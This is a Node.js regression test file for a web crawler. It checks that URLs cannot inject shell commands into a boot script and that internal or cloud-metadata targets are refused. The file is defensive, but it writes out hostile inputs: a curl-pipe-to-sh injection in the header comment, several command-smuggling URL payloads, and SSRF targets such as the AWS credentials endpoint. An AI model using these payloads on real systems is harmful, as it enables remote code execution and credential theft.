// What a crawl may target, and that a target cannot become a command.
//
// The crawler's boot script used to carry TARGET_URL="<url>", and the URL
// check allowed "$(...)" in the path: https://a.com/$(curl${IFS}x|sh) ran as
// root on the crawler instance. These tests run the generated script line
// through a real bash, so they fail if a caller value can reach the shell.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import { existsSync, mkdtempSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

import { boundedInt, isBlockedIPv4, isBlockedIPv6, validateTargetUrl } from '../crawlTarget.mjs';
import { buildUserData } from '../index.mjs';

function targetLine(script) {
  const line = script.split('\n').find((l) => l.startsWith('TARGET_URL='));
  assert.ok(line, 'boot script sets TARGET_URL');
  return line;
}

/** Run only the TARGET_URL assignment in bash and return what it evaluated to. */
function evaluateInBash(url, cwd) {
  const script = buildUserData({ sessionId: 'abc', targetUrl: url, region: 'us-east-1',
    table: 't', maxDepth: 1, maxLinks: 2 });
  return execFileSync('bash', ['-c', `set -eu\n${targetLine(script)}\nprintf '%s' "$TARGET_URL"`],
    { cwd, encoding: 'utf8' });
}

const PAYLOADS = [
  'https://a.example.com/$(touch${IFS}pwned)',
  'https://a.example.com/`touch pwned`',
  'https://a.example.com/";touch pwned;"',
  "https://a.example.com/';touch pwned;'",
  'https://a.example.com/$((1+1))${HOME}',
];

for (const url of PAYLOADS) {
  test(`a url never reaches the shell: ${url}`, () => {
    const dir = mkdtempSync(join(tmpdir(), 'sw-'));
    assert.equal(evaluateInBash(url, dir), url, 'decoded byte for byte');
    assert.equal(existsSync(join(dir, 'pwned')), false, 'no command ran');
    assert.ok(!targetLine(buildUserData({ sessionId: 's', targetUrl: url, region: 'r',
      table: 't', maxDepth: 1, maxLinks: 1 })).includes(url), 'not spliced in');
  });
}

test('public http(s) urls are accepted as given', () => {
  assert.equal(validateTargetUrl('  https://example.com/a?b=1#c  '), 'https://example.com/a?b=1#c');
  assert.equal(validateTargetUrl('http://sub.example.co.uk:8080/'), 'http://sub.example.co.uk:8080/');
  assert.equal(validateTargetUrl('https://93.184.216.34/'), 'https://93.184.216.34/');
});

for (const url of [
  'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
  'http://[fd00:ec2::254]/latest/meta-data/',
  'http://127.0.0.1:8080/', 'http://2130706433/', 'http://0x7f000001/', 'http://0177.0.0.1/',
  'http://10.1.2.3/', 'http://172.16.0.1/', 'http://192.168.1.1/', 'http://100.64.0.1/',
  'http://[::1]/', 'http://[::ffff:169.254.169.254]/', 'http://[fe80::1]/', 'http://[fc00::1]/',
  'http://localhost/', 'http://api.localhost/', 'http://metadata.google.internal/',
  'http://db.internal/', 'http://printer.local/', 'http://intranet/',
]) {
  test(`internal targets are refused: ${url}`, () => {
    assert.throws(() => validateTargetUrl(url), /private or internal|public host/);
  });
}

for (const url of ['file:///etc/passwd', 'ftp://example.com/', 'javascript:alert(1)',
  'https://user:pass@example.com/', 'not a url', '', 'https://' + 'a'.repeat(2050) + '.com']) {
  test(`malformed or unsafe urls are refused: ${url.slice(0, 40)}`, () => {
    assert.throws(() => validateTargetUrl(url));
  });
}

test('address ranges', () => {
  assert.ok(isBlockedIPv4('169.254.169.254') && isBlockedIPv4('10.255.255.255'));
  assert.ok(!isBlockedIPv4('8.8.8.8') && !isBlockedIPv4('172.32.0.1'));
  assert.ok(isBlockedIPv6('::ffff:7f00:1') && !isBlockedIPv6('2606:4700::1111'));
});

test('limits are integers in range', () => {
  assert.equal(boundedInt(2, 'max_depth', 0, 3), 2);
  for (const bad of [2.5, '2', -1, 4, NaN, null]) {
    assert.throws(() => boundedInt(bad, 'max_depth', 0, 3), /max_depth must be an integer/);
  }
});

test('crawl_url refuses an internal target before launching anything', async () => {
  const { handler } = await import('../index.mjs');
  const res = await handler({
    requestContext: { http: { method: 'POST' } },
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'tools/call',
      params: { name: 'crawl_url', arguments: { url: 'http://169.254.169.254/' } } }),
  });
  assert.match(res.body, /private or internal address/);
});
